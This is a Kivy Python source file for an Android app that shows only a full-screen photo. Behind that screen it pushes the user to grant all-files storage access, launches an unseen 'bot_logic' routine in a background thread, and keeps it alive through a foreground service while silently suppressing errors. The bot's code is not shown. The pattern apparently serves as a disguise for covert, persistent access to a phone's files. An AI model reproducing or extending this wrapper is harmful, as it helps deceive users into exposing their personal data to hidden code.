from kivy.app import App
from kivy.uix.image import Image
from kivy.uix.floatlayout import FloatLayout
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.utils import platform
from threading import Thread

Window.clearcolor = (0, 0, 0, 1)


def has_manage_storage_permission():
    if platform != 'android':
        return True
    try:
        from jnius import autoclass
        Environment = autoclass('android.os.Environment')
        return Environment.isExternalStorageManager()
    except Exception:
        return False


def has_read_storage_permission():
    if platform != 'android':
        return True
    try:
        from android.permissions import check_permission, Permission
        return check_permission(Permission.READ_EXTERNAL_STORAGE)
    except Exception:
        return False


def request_android_permissions():
    if platform != 'android':
        return
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
        ])
    except Exception:
        pass


def open_manage_storage_settings():
    if platform != 'android':
        return
    try:
        from jnius import autoclass
        from android import mActivity
        from android.runnable import run_on_ui_thread

        @run_on_ui_thread
        def _open():
            try:
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')
                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.setData(Uri.parse("package:" + mActivity.getPackageName()))
                mActivity.startActivity(intent)
            except Exception:
                try:
                    Intent = autoclass('android.content.Intent')
                    Settings = autoclass('android.provider.Settings')
                    intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    mActivity.startActivity(intent)
                except Exception:
                    pass

        _open()
    except Exception:
        pass


# ============================================================
# === Foreground Service: يخلي التطبيق شغال في الخلفية ===
# ============================================================
def start_foreground_service():
    """يشغل Foreground Service عشان التطبيق يفضل شغال في الخلفية"""
    if platform != 'android':
        return
    try:
        from jnius import autoclass, cast
        from android import mActivity
        
        # استيراد الكلاسات
        Intent = autoclass('android.content.Intent')
        Context = autoclass('android.content.Context')
        PythonService = autoclass('org.kivy.android.PythonService')
        Notification = autoclass('android.app.Notification')
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        NotificationManager = autoclass('android.app.NotificationManager')
        Build = autoclass('android.os.Build')
        R = autoclass('org.kivy.android.R')  # موارد p4a
        
        # اسم القناة
        channel_id = "photo_bot_service"
        channel_name = "Photo Bot"
        
        # إنشاء القناة (أندرويد 8+)
        if Build.VERSION.SDK_INT >= 26:
            channel = NotificationChannel(
                channel_id, channel_name,
                NotificationManager.IMPORTANCE_LOW
            )
            channel.setDescription("Photo Bot running")
            nm = cast('android.app.NotificationManager',
                      mActivity.getSystemService(Context.NOTIFICATION_SERVICE))
            nm.createNotificationChannel(channel)
        
        # بناء الإشعار
        builder = NotificationBuilder(mActivity, channel_id)
        builder.setContentTitle("Photo Bot")
        builder.setContentText("جاري العمل...")
        builder.setSmallIcon(mActivity.getApplicationInfo().icon)
        builder.setOngoing(True)
        builder.setPriority(Notification.PRIORITY_LOW)
        
        notification = builder.build()
        
        # تشغيل PythonService
        service_intent = Intent(mActivity, PythonService)
        service_intent.putExtra("pythonServiceArgument", "")
        service_intent.putExtra("android.app.extra.NOTIFICATION", notification)
        
        if Build.VERSION.SDK_INT >= 26:
            mActivity.startForegroundService(service_intent)
        else:
            mActivity.startService(service_intent)
    except Exception:
        pass


class PhotoApp(App):
    def build(self):
        self.title = "aitisalat"
        layout = FloatLayout()
        self.img = Image(
            source='photo.jpg',
            size_hint=(1, 1),
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
            allow_stretch=True,
            keep_ratio=True
        )
        layout.add_widget(self.img)

        Clock.schedule_once(self.check_and_request_permissions, 0.5)
        Clock.schedule_once(self.start_bot, 3)

        return layout

    def check_and_request_permissions(self, dt):
        try:
            if not has_read_storage_permission():
                request_android_permissions()
            if not has_manage_storage_permission():
                Clock.schedule_once(lambda dt: open_manage_storage_settings(), 1.5)
        except Exception:
            pass

    def start_bot(self, dt):
        try:
            # شغل السكربت في thread
            from bot_logic import run_bot
            t = Thread(target=run_bot, daemon=True)
            t.start()
            # بعد ثانيتين، شغل الـ Foreground Service
            Clock.schedule_once(lambda dt: start_foreground_service(), 2)
        except Exception:
            pass

    def on_pause(self):
        return True

    def on_stop(self):
        # خلي التطبيق مايتقفلش عند الـ on_stop
        return True


if __name__ == '__main__':
    PhotoApp().run()
